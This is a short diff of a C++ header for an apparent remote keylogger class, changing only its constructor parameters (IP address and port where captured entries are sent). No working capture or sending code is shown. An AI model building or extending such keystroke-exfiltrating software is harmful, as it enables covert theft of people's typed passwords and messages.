@@ -20,7 +20,7 @@ class keylogger_remote : virtual public keylogger
   		* p_ip_address :  adress ip where send the entry
       * p_port : port to use
   		*/
-  		keylogger_remote(size_t p_buffer_size, string p_ipd_address, int p_port);
+  		keylogger_remote(string p_ip_address, int p_port);
 
       /*
       * Destructor
